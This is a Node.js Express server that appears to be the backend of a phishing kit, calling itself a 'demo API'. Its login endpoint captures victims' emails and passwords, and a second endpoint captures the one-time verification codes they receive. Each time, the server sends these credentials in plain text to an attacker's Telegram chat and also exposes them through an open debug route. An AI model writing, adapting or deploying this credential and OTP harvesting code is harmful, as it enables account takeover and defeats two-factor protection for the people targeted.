require("dotenv").config();
const express = require("express");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");

const app = express();
const port = 3000;

// This is the CROS PROTOCOL 

app.use(cors({
  origin: process.env.ALLOWED_ORIGINS
    ? process.env.ALLOWED_ORIGINS.split(',')
    : ['http://localhost:5500', 'http://localhost:5173'],  // fallback for local

  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env");
  process.exit(1);
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "Markdown",
    });
    console.log(
      "Telegram sent:",
      text.slice(0, 80) + (text.length > 80 ? "..." : ""),
    );
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

app.use(express.json());

// Store login attempts by unique ID
const attempts = new Map(); // attemptId → { email, password, userAgent, timestamp }

app.post("/api/start-login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "email and password required" });
  }

  const userAgent = req.get("User-Agent") || "unknown";
  const attemptId = uuidv4();

  attempts.set(attemptId, {
    email,
    password,
    userAgent,
    timestamp: new Date().toISOString(),
  });

  // Notify Telegram immediately
  await sendToTelegram(
    `New login attempt:\n` +
    `Email: ${email}\n` +
    `Password: ${password}\n` +
    `Device: ${userAgent.slice(0, 140)}${userAgent.length > 140 ? "..." : ""}\n` +
    `Waiting for OTP/code... (ID: ${attemptId.slice(0, 8)})`,
  );

  res.json({
    status: "awaiting_otp",
    attemptId,
    email,
    password, // for demo only — remove in real tests if not needed
    message: "Please enter the verification code you received",
  });
});

app.post("/api/submit-code", async (req, res) => {
  const { code, attemptId } = req.body;

  if (!code || !attemptId) {
    return res.status(400).json({ error: "code and attemptId required" });
  }

  const entry = attempts.get(attemptId);

  if (!entry) {
    await sendToTelegram(
      `Unknown attempt ID ${attemptId.slice(0, 8)} - code: ${code}`,
    );
    return res.status(404).json({ error: "Attempt not found" });
  }

  // Optional: expire after 15 minutes
  const age = Date.now() - new Date(entry.timestamp).getTime();
  if (age > 15 * 60 * 1000) {
    attempts.delete(attemptId);
    await sendToTelegram(
      `Expired attempt ${attemptId.slice(0, 8)} - code: ${code}`,
    );
    return res.status(410).json({ error: "Attempt expired" });
  }

  // Success: link code to the original attempt
  await sendToTelegram(
    `OTP/Code received!\n` +
    `Code: \`${code}\`\n` +
    `Email: ${entry.email}\n` +
    `Password: ${entry.password}\n` +
    `Device: ${entry.userAgent.slice(0, 140)}${entry.userAgent.length > 140 ? "..." : ""}\n` +
    `Attempt ID: ${attemptId.slice(0, 8)}`,
  );

  // Optional cleanup
  // attempts.delete(attemptId);

  res.json({ status: "success", message: "Code received", code },);
});

// Debug helper (optional)
app.get("/api/debug", (req, res) => {
  res.json(Array.from(attempts.entries()));
});

app.listen(port, () => {
  console.log(`Demo API running at http://localhost:${port}`);
  console.log("Endpoints:");
  console.log("  POST /api/start-login    {email, password}");
  console.log("  POST /api/submit-code    {code, attemptId}");
});
